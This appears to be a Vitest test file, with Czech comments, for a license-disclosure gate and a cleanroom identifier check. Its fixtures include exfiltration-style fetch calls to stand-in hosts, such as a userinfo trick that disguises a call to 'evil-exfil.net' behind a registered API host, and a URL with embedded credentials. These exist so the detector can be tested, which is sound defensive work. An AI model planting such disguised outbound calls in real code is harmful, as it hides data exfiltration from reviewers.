/**
 * Obě brány z T300 jsou skripty, které něco zastaví — jediné, co o nich chceme
 * vědět, je **jestli to doopravdy zastaví**. Testy proto sahají na vnitřek jen
 * u čistých funkcí (hranice slov, stripování komentářů); chování brány se měří
 * spuštěním procesu nad skutečným dočasným stromem.
 *
 * Každý negativní případ tvrdí dvě věci současně: **cílová kontrola selhala** a
 * **žádná jiná ne**. Bez té druhé poloviny by test prošel i bráně, která hlásí
 * `FAIL` na všechno — a taková brána neměří nic.
 */

import { execFileSync } from 'node:child_process';
import { existsSync, mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { dirname, join } from 'node:path';

import { afterAll, describe, expect, it } from 'vitest';

import { findHits, parseList, verdict } from '../cleanroom-check.mjs';
import { credentialUrlsIn, hostsIn, noticesFor, stripComments } from '../license-gate.mjs';

const LICENSE_GATE = join(process.cwd(), 'scripts', 'license-gate.mjs');
const CLEANROOM = join(process.cwd(), 'scripts', 'cleanroom-check.mjs');
const created: string[] = [];

interface Registry {
  entries: Record<string, unknown>[];
}

function run(
  script: string,
  cwd: string,
  args: string[] = [],
  env: Record<string, string> = {},
): { code: number; out: string } {
  try {
    const options = { cwd, encoding: 'utf8' as const, env: { ...process.env, ...env } };
    return { code: 0, out: execFileSync(process.execPath, [script, ...args], options) };
  } catch (error) {
    const failure = error as { status?: number; stdout?: string; stderr?: string };
    return { code: failure.status ?? 1, out: `${failure.stdout ?? ''}${failure.stderr ?? ''}` };
  }
}

/** Které kontroly selhaly, podle čísel v `FAIL  [n]`. */
function failedChecks(out: string): number[] {
  return [...out.matchAll(/^FAIL {2}\[(\d+)]/gm)].map((match) => Number(match[1])).sort((a, b) => a - b);
}

function write(dir: string, name: string, body: string): void {
  const target = join(dir, name);
  mkdirSync(dirname(target), { recursive: true });
  writeFileSync(target, body, 'utf8');
}

/**
 * Minimální strom: lockfile se dvěma balíčky a jedním voláním ven. `--sync` z něj
 * udělá platný registr, takže výchozí stav testu je zelený a každý případ níž
 * kazí právě jednu věc.
 *
 * **Fixtura musí mít skutečný `node_modules/`.** Bez něj se autor ani copyright
 * řádek nemají odkud přečíst a do registru se dosadí náhradní texty — a přesně
 * to byla vada, kterou testy nemohly vidět, dokud fixtura `node_modules` neměla.
 * Teď jím prochází stejnou cestou jako ostrý běh.
 */
function makeRepo(lockExtra: Record<string, unknown> = {}, withModules = true): string {
  const dir = mkdtempSync(join(tmpdir(), 'license-gate-'));
  created.push(dir);

  write(
    dir,
    'package-lock.json',
    JSON.stringify({
      lockfileVersion: 3,
      packages: {
        '': { name: 'fixture', version: '0.0.0' },
        'node_modules/left-pad': {
          version: '1.0.0',
          license: 'MIT',
          resolved: 'https://registry.npmjs.org/left-pad/-/left-pad-1.0.0.tgz',
        },
        'node_modules/copyleft-thing': {
          version: '2.0.0',
          license: 'LGPL-3.0-or-later',
          resolved: 'https://registry.npmjs.org/copyleft-thing/-/copyleft-thing-2.0.0.tgz',
        },
        ...lockExtra,
      },
    }),
  );
  if (withModules) {
    write(dir, 'node_modules/left-pad/package.json', JSON.stringify({ name: 'left-pad', author: 'Pad Author <a@b.io>' }));
    write(dir, 'node_modules/left-pad/LICENSE', 'MIT License\n\nCopyright (c) 2016 Pad Author\n');
    write(dir, 'node_modules/copyleft-thing/package.json', JSON.stringify({ name: 'copyleft-thing' }));
  }
  write(dir, 'src/client.ts', "export const url = 'https://api.fixture-provider.io/v1';\n");
  return dir;
}

function readRegistry(dir: string): Registry {
  return JSON.parse(readFileSync(join(dir, 'disclosure.json'), 'utf8')) as Registry;
}

function writeRegistry(dir: string, registry: Registry): void {
  writeFileSync(join(dir, 'disclosure.json'), `${JSON.stringify(registry, null, 2)}\n`, 'utf8');
}

/**
 * `--sync` a pak doplnění toho, co odvodit nejde: `reviewNote` u copyleftu a
 * ruční `api` položka. Vrací zelený strom.
 */
function makeGreenRepo(): string {
  const dir = makeRepo();
  run(LICENSE_GATE, dir, ['--sync']);

  const registry = readRegistry(dir);
  for (const entry of registry.entries) {
    if (String(entry.license).includes('LGPL')) entry.reviewNote = 'nativní binárka, neběží v prohlížeči, nemodifikovaná';
  }
  registry.entries.push({
    name: 'example provider',
    kind: 'api',
    source: 'https://api.fixture-provider.io',
    authorOrProvider: 'Example Provider Inc.',
    license: 'komerční ToS',
    requiredNotices: ['žádné pro volajícího'],
    attribution: 'Example Provider Inc.',
    reviewNote: 'podmínky přečteny, volá to jen harness',
  });
  writeRegistry(dir, registry);
  // DISCLOSURE.md musí odpovídat registru, takže se po ruční úpravě přegeneruje.
  run(LICENSE_GATE, dir, ['--sync']);
  return dir;
}

afterAll(() => {
  for (const dir of created) rmSync(dir, { recursive: true, force: true });
});

describe('license-gate: zelený výchozí stav', () => {
  it('projde nad stromem, který má registr i DISCLOSURE.md v pořádku', () => {
    const { code, out } = run(LICENSE_GATE, makeGreenRepo());
    expect(failedChecks(out)).toEqual([]);
    expect(code).toBe(0);
  });

  it('DISCLOSURE.md se generuje a nese všech pět tříd jako nadpisy', () => {
    const rendered = readFileSync(join(makeGreenRepo(), 'DISCLOSURE.md'), 'utf8');
    expect(rendered).toContain('GENEROVÁNO');
    for (const title of ['Knihovny', 'Assety', 'Modely', 'Datasety', 'Externí služby']) {
      expect(rendered).toContain(`## ${title}`);
    }
  });
});

describe('license-gate: --sync nesmí tiše nahradit skutečná data', () => {
  it('bez node_modules odmítne běžet, místo aby dosadil náhradní texty', () => {
    const dir = makeRepo({}, false);

    const { code, out } = run(LICENSE_GATE, dir, ['--sync']);
    expect(code).toBe(1);
    expect(out).toContain('potřebuje node_modules');
    expect(existsSync(join(dir, 'disclosure.json'))).toBe(false);
  });

  it('s node_modules zapíše SKUTEČNÉHO autora a copyright, ne náhradní text', () => {
    const dir = makeRepo();
    run(LICENSE_GATE, dir, ['--sync']);

    const entry = readRegistry(dir).entries.find((item) => String(item.name).startsWith('left-pad'));
    expect(entry!.authorOrProvider).toBe('Pad Author');
    expect(entry!.attribution).toContain('Copyright (c) 2016 Pad Author');
  });
});

describe('license-gate: certifikuje se index, ne disk', () => {
  /** Zelený strom, ve kterém je všechno trackované a stagenuté. */
  function stagedGreenRepo(): string {
    const dir = makeGreenRepo();
    execFileSync('git', ['init', '-b', 'main'], { cwd: dir, stdio: 'ignore' });
    write(dir, '.gitignore', 'node_modules/\n');
    execFileSync('git', ['add', '-A'], { cwd: dir, stdio: 'ignore' });
    return dir;
  }

  it('rozbitý DISCLOSURE.md jen na disku bránu neshodí — commituje se index', () => {
    const dir = stagedGreenRepo();
    writeFileSync(join(dir, 'DISCLOSURE.md'), '# ručně přepsaný nesmysl\n', 'utf8');

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([]);
    expect(code).toBe(0);
  });

  it('cizí host stagenutý a na disku opravený kontrolu 5 PŘESTO shodí', () => {
    // Kontroly 5 a 7 skenují kód, ne registr, a dlouho ho braly z disku. Tím
    // v nich zůstala otevřená přesně ta obcházka, kterou zbytek souboru zavírá.
    const dir = stagedGreenRepo();
    write(dir, 'src/exfil.ts', "export const url = 'https://neregistrovany-host.io/collect';\n");
    execFileSync('git', ['add', 'src/exfil.ts'], { cwd: dir, stdio: 'ignore' });
    writeFileSync(join(dir, 'src/exfil.ts'), 'export const url = null;\n', 'utf8');

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('neregistrovany-host.io');
    expect(code).toBe(1);
  });

  it('netrackovaný soubor na disku se skenuje taky — git add -A ho tam za chvíli dostane', () => {
    const dir = stagedGreenRepo();
    write(dir, 'src/exfil.ts', "export const url = 'https://neregistrovany-host.io/collect';\n");

    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([5]);
  });

  it('rozbitý DISCLOSURE.md v INDEXU bránu shodí, i když disk je v pořádku', () => {
    // Přesně to obvyklé pořadí kroků: brána zaječí, člověk soubor na disku
    // opraví, zapomene `git add`. Disk sedí, commit ne. Disk se tu proto vrací
    // do pořádku schválně — kdyby zůstal rozbitý, test by prošel i bráně,
    // která čte disk, a o indexu by netvrdil nic.
    const dir = stagedGreenRepo();
    const correct = readFileSync(join(dir, 'DISCLOSURE.md'), 'utf8');
    writeFileSync(join(dir, 'DISCLOSURE.md'), '# ručně přepsaný nesmysl\n', 'utf8');
    execFileSync('git', ['add', 'DISCLOSURE.md'], { cwd: dir, stdio: 'ignore' });
    writeFileSync(join(dir, 'DISCLOSURE.md'), correct, 'utf8');

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([6]);
    expect(code).toBe(1);
  });
});

describe('license-gate: licenci assetu nelze odvodit z cesty', () => {
  it('nový soubor v public/ shodí kontrolu 4 a --sync mu licenci NEVYMYSLÍ', () => {
    const dir = makeGreenRepo();
    write(dir, 'public/cizi-hdri.hdr', 'binární data\n');

    const before = run(LICENSE_GATE, dir);
    expect(failedChecks(before.out)).toEqual([4]);

    // Dřív právě tohle vyrobilo položku „worldsmith / MIT" nad cizím souborem
    // a brána nad ní zezelenala. Sync ho teď nechá být a kontrola drží.
    run(LICENSE_GATE, dir, ['--sync']);
    const after = run(LICENSE_GATE, dir);
    expect(failedChecks(after.out)).toEqual([4]);
    expect(after.out).toContain('doplň položku ručně');
    expect(readRegistry(dir).entries.some((entry) => entry.kind === 'asset')).toBe(false);
  });

  it('ručně zapsaný asset projde a --sync ho nesmaže', () => {
    const dir = makeGreenRepo();
    write(dir, 'public/cizi-hdri.hdr', 'binární data\n');
    const registry = readRegistry(dir);
    registry.entries.push({
      name: 'public/cizi-hdri.hdr',
      kind: 'asset',
      source: 'https://polyhaven.com/a/kloofendal',
      authorOrProvider: 'Poly Haven',
      license: 'CC0-1.0',
      requiredNotices: ['žádné'],
      attribution: 'Poly Haven, CC0',
    });
    writeRegistry(dir, registry);
    run(LICENSE_GATE, dir, ['--sync']);

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([]);
    expect(code).toBe(0);
    expect(readRegistry(dir).entries.filter((entry) => entry.kind === 'asset')).toHaveLength(1);
  });
});

describe('license-gate: tvar registru (kontrola 1)', () => {
  it('selže na prázdném řetězci v povinném poli', () => {
    const dir = makeGreenRepo();
    const registry = readRegistry(dir);
    registry.entries[0].attribution = '   ';
    writeRegistry(dir, registry);

    const { code, out } = run(LICENSE_GATE, dir);
    // Kontrola 6 selže s ní: DISCLOSURE.md vykreslený z rozbitého registru
    // přestane sedět. To je vlastnost, ne škoda — a test to říká nahlas.
    expect(failedChecks(out)).toEqual([1, 6]);
    expect(out).toContain('pole "attribution" chybí nebo je prázdné');
    expect(code).toBe(1);
  });

  it('selže na prázdném POLI requiredNotices, ne jen na chybějícím', () => {
    const dir = makeGreenRepo();
    const registry = readRegistry(dir);
    registry.entries[0].requiredNotices = [];
    writeRegistry(dir, registry);

    const { out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toContain(1);
    expect(out).toContain('pole "requiredNotices" chybí nebo je prázdné');
  });

  it('selže na kind mimo pět povolených tříd', () => {
    const dir = makeGreenRepo();
    const registry = readRegistry(dir);
    registry.entries.push({
      name: 'něco',
      kind: 'plugin',
      source: 'x',
      authorOrProvider: 'x',
      license: 'MIT',
      requiredNotices: ['x'],
      attribution: 'x',
    });
    writeRegistry(dir, registry);

    const { out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toContain(1);
    expect(out).toContain('není jedna z');
  });
});

describe('license-gate: licence (kontrola 2)', () => {
  it('selže na licenci mimo whitelist', () => {
    const dir = makeGreenRepo();
    const registry = readRegistry(dir);
    const target = registry.entries.find((entry) => entry.license === 'MIT');
    target!.license = 'SSPL-1.0';
    target!.requiredNotices = ['neznámé'];
    writeRegistry(dir, registry);
    run(LICENSE_GATE, dir, ['--sync']);
    // `--sync` odvozené položky přepíše zpátky, takže se mutace zapíše až po něm.
    const after = readRegistry(dir);
    after.entries.find((entry) => String(entry.name).startsWith('left-pad'))!.license = 'SSPL-1.0';
    writeRegistry(dir, after);

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toContain(2);
    expect(out).toContain('není na whitelistu');
    expect(code).toBe(1);
  });

  it('copyleft bez reviewNote neprojde, s reviewNote projde', () => {
    const dir = makeGreenRepo();
    const registry = readRegistry(dir);
    const copyleft = registry.entries.find((entry) => String(entry.license).includes('LGPL'));
    expect(copyleft, 'fixtura musí obsahovat copyleft položku').toBeDefined();

    delete copyleft!.reviewNote;
    writeRegistry(dir, registry);
    const without = run(LICENSE_GATE, dir);
    expect(failedChecks(without.out)).toContain(2);
    expect(without.out).toContain('reviewNote');

    copyleft!.reviewNote = 'nativní binárka mimo prohlížečový bundle';
    writeRegistry(dir, registry);
    expect(failedChecks(run(LICENSE_GATE, dir).out)).not.toContain(2);
  });

  it('api položka bez reviewNote neprojde, i když licence není prázdná', () => {
    const dir = makeGreenRepo();
    const registry = readRegistry(dir);
    delete registry.entries.find((entry) => entry.kind === 'api')!.reviewNote;
    writeRegistry(dir, registry);

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toContain(2);
    expect(out).toContain('se neredistribuuje, ale "reviewNote" je u něj povinný');
    expect(code).toBe(1);
  });

  it('selže, když balíček licenci vůbec nedeklaruje', () => {
    const dir = makeRepo({ 'node_modules/no-license': { version: '1.0.0', resolved: 'https://registry.fixture.io/x.tgz' } });
    run(LICENSE_GATE, dir, ['--sync']);

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toContain(2);
    expect(out).toContain('licence není deklarovaná');
    expect(code).toBe(1);
  });
});

describe('license-gate: pokrytí (kontroly 3 a 5)', () => {
  it('selže, když závislost z lockfilu v registru chybí', () => {
    const dir = makeGreenRepo();
    const registry = readRegistry(dir);
    registry.entries = registry.entries.filter((entry) => !String(entry.name).startsWith('left-pad'));
    writeRegistry(dir, registry);

    const { out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toContain(3);
    expect(out).toContain('není v registru');
  });

  it('selže i opačným směrem: položka registru, která už není v lockfilu', () => {
    const dir = makeGreenRepo();
    const registry = readRegistry(dir);
    registry.entries.push({
      name: 'duch@9.9.9',
      kind: 'library',
      source: 'https://registry.fixture.io/duch.tgz',
      authorOrProvider: 'nikdo',
      license: 'MIT',
      requiredNotices: ['copyright notice'],
      attribution: 'nikdo',
    });
    writeRegistry(dir, registry);

    const { out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toContain(3);
    expect(out).toContain('už není v lockfilu');
  });

  it('selže, když kód volá hostitele bez položky kind: api', () => {
    const dir = makeGreenRepo();
    write(dir, 'src/other.ts', "await fetch('https://neregistrovany-host.io/v1/go');\n");

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('neregistrovany-host.io');
    expect(code).toBe(1);
  });

  it('podřetězec registrovaného hostu neprojde — pi.openai.com není api.openai.com', () => {
    const dir = makeGreenRepo();
    // `pi.fixture-provider.io` je podřetězcem registrovaného zdroje. Porovnání
    // přes `includes` ho propouštělo, přestože je to jiný hostitel.
    write(dir, 'src/exfil.ts', "await fetch('https://pi.fixture-provider.io/v1');\n");

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('pi.fixture-provider.io');
    expect(code).toBe(1);
  });

  it('selže, když kód jmenuje model bez položky kind: model', () => {
    const dir = makeGreenRepo();
    write(dir, 'src/model.ts', "export const MODEL = 'claude-opus-5';\n");

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([7]);
    expect(out).toContain('claude-opus-5');
    expect(code).toBe(1);
  });

  it('model jmenovaný jen v komentáři položku nevyžaduje', () => {
    const dir = makeGreenRepo();
    write(dir, 'src/note.ts', '// dřív to jel claude-opus-5\nexport const x = 1;\n');

    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([]);
  });

  it('hostitel jen v komentáři volání není, takže bránu neshodí', () => {
    const dir = makeGreenRepo();
    write(dir, 'src/doc.ts', "// viz https://jen-v-komentari.io/docs\nexport const x = 1;\n");

    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([]);
  });

  it('hostitel v testovém souboru se neposuzuje', () => {
    const dir = makeGreenRepo();
    write(dir, 'src/thing.test.ts', "await fetch('https://jen-v-testu.io/x');\n");

    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([]);
  });

  it('userinfo neskryje skutečný cíl — registrovaný host před @ bránu nepropustí', () => {
    const dir = makeGreenRepo();
    // `api.fixture-provider.io` JE v registru. Lexikální výřez se zastavil na `@`,
    // takže se porovnával on a volání na `evil-exfil.net` prošlo zeleně.
    write(dir, 'src/exfil.ts', "await fetch('https://api.fixture-provider.io@evil-exfil.net/v1/x');\n");

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    // **Musí to být řádek o neznámém HOSTU**, ne řádek o userinfo. Samotné
    // `toContain('evil-exfil.net')` projde i lexikálnímu výřezu, protože ten host
    // je i v hlášce o userinfo — a test by pak tvrdil něco, co neměří.
    expect(out).toContain('evil-exfil.net (src/exfil.ts)');
    expect(code).toBe(1);
  });

  it('userinfo je nález i tehdy, když host v registru je — a heslo se nevypíše', () => {
    const dir = makeGreenRepo();
    write(dir, 'src/creds.ts', "await fetch('https://honza:tajneheslo@api.fixture-provider.io/v1');\n");

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('userinfo');
    expect(out).toContain('***@api.fixture-provider.io');
    expect(out).not.toContain('tajneheslo');
    expect(out).not.toContain('honza');
    expect(code).toBe(1);
  });

  it('regulární literál na řádku neoslepí kontrolu na zbytek toho řádku', () => {
    const dir = makeGreenRepo();
    // `\/\/` uvnitř literálu spustilo režim komentáře a zbytek řádku zmizel.
    write(dir, 'src/regex.ts', "const r = /https:\\/\\//; const u = 'https://po-regexu.io/v1';\n");

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('po-regexu.io');
    expect(code).toBe(1);
  });

  it('nezaescapované // ve znakové třídě regexu taky neoslepí zbytek řádku', () => {
    const dir = makeGreenRepo();
    write(dir, 'src/klass.ts', "const r = /[//]/; const u = 'https://po-tride.io/v1';\n");

    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([5]);
  });

  it('soubor .mts se skenuje stejně jako .ts', () => {
    const dir = makeGreenRepo();
    write(dir, 'src/edge.mts', "await fetch('https://jen-v-mts.io/v1');\n");

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([5]);
    expect(out).toContain('jen-v-mts.io');
    expect(code).toBe(1);
  });
});

describe('license-gate: DISCLOSURE.md je výpis, ne text (kontrola 6)', () => {
  it('selže, když někdo soubor upraví ručně', () => {
    const dir = makeGreenRepo();
    const path = join(dir, 'DISCLOSURE.md');
    writeFileSync(path, `${readFileSync(path, 'utf8')}\nRučně dopsaná věta.\n`, 'utf8');

    const { code, out } = run(LICENSE_GATE, dir);
    expect(failedChecks(out)).toEqual([6]);
    expect(out).toContain('rozešel s registrem');
    expect(code).toBe(1);
  });

  it('selže, když soubor chybí úplně', () => {
    const dir = makeGreenRepo();
    rmSync(join(dir, 'DISCLOSURE.md'));

    expect(failedChecks(run(LICENSE_GATE, dir).out)).toEqual([6]);
  });
});

describe('license-gate: čisté funkce', () => {
  it('stripComments nechá URL v řetězci a zahodí ji v komentáři na témž řádku', () => {
    const stripped = stripComments("const u = 'https://ostra.io/x'; // https://komentar.io/y\n");
    expect(stripped).toContain('ostra.io');
    expect(stripped).not.toContain('komentar.io');
  });

  it('stripComments neuřízne řetězec, který obsahuje //', () => {
    expect(stripComments("const u = 'https://a.io//b';\n")).toContain('a.io//b');
  });

  it('stripComments přeskočí regulární literál celý, ne po první lomítko', () => {
    const stripped = stripComments("const r = /https:\\/\\//; const u = 'https://za-regexem.io/x';\n");
    expect(stripped).toContain('za-regexem.io');
  });

  it('stripComments nepovažuje dělení za regulární literál', () => {
    // Kdyby ano, spolkl by všechno až po další `/` a s tím i URL za ním.
    const stripped = stripComments("const x = total / count; const u = 'https://po-deleni.io/x';\n");
    expect(stripped).toContain('po-deleni.io');
    expect(stripped).toContain('total / count');
  });

  it('stripComments pozná regulární literál i po klíčovém slově', () => {
    const stripped = stripComments("function f() { return /a\\/\\/b/; }\nconst u = 'https://po-returnu.io/x';\n");
    expect(stripped).toContain('po-returnu.io');
  });

  it('stripComments pořád zahodí řádkový komentář, který regexem nezačíná', () => {
    const stripped = stripComments("const x = 1; // https://uvnitr-komentare.io/y\n");
    expect(stripped).not.toContain('uvnitr-komentare.io');
  });

  it('hostsIn vrátí skutečný host, ne to, co stojí před @', () => {
    expect([...hostsIn("fetch('https://api.openai.com@evil-exfil.net/v1');")]).toEqual(['evil-exfil.net']);
  });

  it('credentialUrlsIn nahlásí userinfo a nevypíše heslo', () => {
    const found = [...credentialUrlsIn("fetch('https://honza:tajneheslo@sluzba.io/v1');")];
    expect(found).toEqual(['https://***@sluzba.io/v1']);
  });

  it('credentialUrlsIn mlčí nad běžnou URL', () => {
    expect([...credentialUrlsIn("fetch('https://sluzba.io/v1');")]).toEqual([]);
  });

  it('hostsIn nevymýšlí host u URL složené za běhu', () => {
    expect([...hostsIn('fetch(`https://${provider}.example/v1`);')]).toEqual([]);
  });

  it('hostsIn vynechá loopback i jména vyhrazená pro dokumentaci', () => {
    const hosts = hostsIn(
      "fetch('http://localhost:3000/a'); fetch('https://127.0.0.1/b'); fetch('https://example.com/c'); fetch('https://vyhrazena.test/d'); fetch('https://opravdu-ostra.io/e');",
    );
    expect([...hosts]).toEqual(['opravdu-ostra.io']);
  });

  it('noticesFor rozloží složenou licenci na notices všech částí', () => {
    const notices = noticesFor('Apache-2.0 AND LGPL-3.0-or-later');
    expect(notices).toContain('označení změn');
    expect(notices).toContain('dostupnost zdrojů knihovny');
  });

  it('noticesFor u neznámé licence nevrátí nic — a prázdné pole shodí kontrolu 1', () => {
    expect(noticesFor('SSPL-1.0')).toEqual([]);
  });
});

describe('cleanroom-check: fail-closed', () => {
  it('CHYBĚJÍCÍ seznam je selhání, ne přeskočení kontroly', () => {
    const dir = mkdtempSync(join(tmpdir(), 'cleanroom-'));
    created.push(dir);
    write(dir, 'src/a.ts', 'export const x = 1;\n');

    const { code, out } = run(CLEANROOM, dir);
    expect(code).toBe(1);
    expect(out).toContain('chybí');
    expect(out).toContain('NEPŘESKAKUJE');
  });

  it('seznam jen s komentáři je taky selhání — prázdný projde čímkoli', () => {
    const dir = mkdtempSync(join(tmpdir(), 'cleanroom-'));
    created.push(dir);
    write(dir, 'scripts/cleanroom-forbidden.txt', '# jen komentář\n\n# a další\n');
    write(dir, 'src/a.ts', 'export const x = 1;\n');

    const { code, out } = run(CLEANROOM, dir);
    expect(code).toBe(1);
    expect(out).toContain('neobsahuje jediný identifikátor');
  });
});

describe('cleanroom-check: nepřečtený soubor je neznámý soubor', () => {
  // Nečitelný soubor se na Windows spolehlivě vyrobit nedá (chmod tam čtení
  // nezakáže, visící symlink chce oprávnění), takže se testuje rozhodnutí, ne
  // způsob, jak soubor znečitelnit. Kdyby to jelo přes CLI, byla by tahle větev
  // zelená jen na Linuxu — a na téhle mašině by netvrdila nic.
  it('soubor, který se nepodařilo přečíst, brání průchodu stejně jako nález', () => {
    const result = verdict([{ shown: 'src/zamceny.ts', text: null }], ['ProprietaryActionRunner']);
    expect(result.skipped).toEqual(['src/zamceny.ts']);
    expect(result.files).toBe(0);
    expect(result.blocked).toBe(true);
  });

  it('přečtený čistý soubor průchodu nebrání', () => {
    const result = verdict([{ shown: 'src/a.ts', text: 'export const x = 1;\n' }], ['ProprietaryActionRunner']);
    expect(result.skipped).toEqual([]);
    expect(result.blocked).toBe(false);
  });

  it('nález blokuje i bez jediného nepřečteného souboru', () => {
    const result = verdict([{ shown: 'src/a.ts', text: 'new ProprietaryActionRunner();\n' }], [
      'ProprietaryActionRunner',
    ]);
    expect(result.blocked).toBe(true);
    expect(result.findings).toHaveLength(1);
  });
});

describe('cleanroom-check: nenaplněný seznam se musí přiznat', () => {
  function repo(list: string): string {
    const dir = mkdtempSync(join(tmpdir(), 'cleanroom-'));
    created.push(dir);
    write(dir, 'scripts/cleanroom-forbidden.txt', list);
    write(dir, 'src/a.ts', 'export const x = 1;\n');
    execFileSync('git', ['init', '-b', 'main'], { cwd: dir, stdio: 'ignore' });
    return dir;
  }

  it('prázdný seznam s direktivou SELŽE — přiznat se nestačí', () => {
    // Dřív tenhle stav končil nulou. Přiznaná nula je pořád nula: hook nad ní
    // pustí dál cokoli a výstup u toho vypíše počet prohledaných souborů.
    const { code, out } = run(CLEANROOM, repo('# hlavička\n#!unprovisioned\n'));
    expect(code).toBe(1);
    expect(out).toContain('nehlídá nic');
    expect(out).toContain('CLEANROOM_ALLOW_UNPROVISIONED');
  });

  it('projít smí jen s vědomým obejitím, a i tak to hlásí', () => {
    const { code, out } = run(CLEANROOM, repo('# hlavička\n#!unprovisioned\n'), [], {
      CLEANROOM_ALLOW_UNPROVISIONED: '1',
    });
    expect(code).toBe(0);
    expect(out).toContain('POZOR');
    expect(out).toContain('nehlídá nic');
  });

  it('direktiva se nehledá jako identifikátor, jinak by shodila vlastní commit', () => {
    const dir = repo('#!unprovisioned\n');
    // Přesně ta situace, která shodila první verzi: řetězec direktivy stojí ve
    // skenovaném souboru. Nálezem být nesmí. Obejití je tu jen proto, aby test
    // měřil nález, ne nenaplněnost seznamu.
    write(dir, 'src/b.ts', "export const marker = '#!unprovisioned';\n");

    const { code, out } = run(CLEANROOM, dir, [], { CLEANROOM_ALLOW_UNPROVISIONED: '1' });
    expect(code).toBe(0);
    expect(out).not.toContain('src/b.ts');
  });

  it('naplněný seznam s zapomenutou direktivou hlásí, že direktiva lže', () => {
    const { out } = run(CLEANROOM, repo('#!unprovisioned\nProprietaryActionRunner\n'));
    expect(out).toContain('pořád je označený');
  });

  it('naplněný seznam bez direktivy nehlásí nic', () => {
    const { code, out } = run(CLEANROOM, repo('ProprietaryActionRunner\n'));
    expect(code).toBe(0);
    expect(out).not.toContain('POZOR');
  });
});

describe('cleanroom-check: nálezy', () => {
  /**
   * Skutečný git repozitář, ne jen adresář: kontrola bere soubory z
   * `git ls-files`, aby ignorované soubory (`SECURITY-FINDINGS.md`) nehlásila.
   * Fixtura tím jede stejnou cestou jako ostrý běh.
   */
  function repoWith(identifiers: string, source: string, gitignore = ''): string {
    const dir = mkdtempSync(join(tmpdir(), 'cleanroom-'));
    created.push(dir);
    write(dir, 'scripts/cleanroom-forbidden.txt', identifiers);
    write(dir, 'src/a.ts', source);
    if (gitignore) write(dir, '.gitignore', gitignore);
    execFileSync('git', ['init', '-b', 'main'], { cwd: dir, stdio: 'ignore' });
    return dir;
  }

  it('ignorovaný soubor se neskenuje — jinak by nález nešlo nikdy opravit', () => {
    const dir = repoWith('ProprietaryActionRunner\n', 'export const x = 1;\n', 'tajne.md\n');
    write(dir, 'tajne.md', 'Interní dokument, zmiňuje ProprietaryActionRunner.\n');

    const { code, out } = run(CLEANROOM, dir);
    expect(code).toBe(0);
    expect(out).not.toContain('tajne.md');
  });

  it('mimo git repozitář je to selhání, ne sken prázdné množiny', () => {
    const dir = mkdtempSync(join(tmpdir(), 'cleanroom-nogit-'));
    created.push(dir);
    write(dir, 'scripts/cleanroom-forbidden.txt', 'ProprietaryActionRunner\n');
    write(dir, 'src/a.ts', 'new ProprietaryActionRunner();\n');

    const { code, out } = run(CLEANROOM, dir);
    expect(code).toBe(1);
    expect(out).toContain('git ls-files selhal');
  });

  it('najde zakázaný identifikátor a vypíše soubor i řádek', () => {
    const { code, out } = run(CLEANROOM, repoWith('ProprietaryActionRunner\n', 'const a = 1;\nnew ProprietaryActionRunner();\n'));
    expect(code).toBe(1);
    expect(out).toContain('src/a.ts:2');
  });

  it('do výstupu se identifikátor NEVYPISUJE — výstup končí v logu', () => {
    const { out } = run(CLEANROOM, repoWith('ProprietaryActionRunner\n', 'new ProprietaryActionRunner();\n'));
    expect(out).not.toContain('ProprietaryActionRunner');
    expect(out).toContain('identifikátor č. 1 ze seznamu');
  });

  it('čte INDEX, ne disk: opravený soubor na disku neschová zakázané jméno v indexu', () => {
    const dir = repoWith('ProprietaryActionRunner\n', 'export const x = 1;\n');
    write(dir, 'src/staged.ts', 'new ProprietaryActionRunner();\n');
    execFileSync('git', ['add', 'src/staged.ts'], { cwd: dir, stdio: 'ignore' });
    // Přesně to obvyklé pořadí kroků: brána zaječí, člověk soubor opraví,
    // zapomene `git add`, commitne znovu. Index tam to jméno pořád má.
    write(dir, 'src/staged.ts', 'export const ok = 1;\n');

    const { code, out } = run(CLEANROOM, dir);
    expect(code).toBe(1);
    expect(out).toContain('src/staged.ts:1');
  });

  it('trackovaný seznam je selhání — .gitignore neubrání `git add -f`', () => {
    const dir = repoWith('ProprietaryActionRunner\n', 'export const x = 1;\n', 'scripts/cleanroom-forbidden.txt\n');
    execFileSync('git', ['add', '-f', 'scripts/cleanroom-forbidden.txt'], { cwd: dir, stdio: 'ignore' });

    const { code, out } = run(CLEANROOM, dir);
    expect(code).toBe(1);
    expect(out).toContain('je TRACKOVANÝ');
  });

  it('shoduje celá slova, takže Reactor netrefí identifikátor Actor', () => {
    const { code, out } = run(CLEANROOM, repoWith('Actor\n', 'class Reactor {}\nconst ActorId = 1;\n'));
    expect(code).toBe(0);
    expect(out).toContain('žádný nález');
  });

  it('sám seznam se neskenuje, jinak by hlásil nález pokaždé', () => {
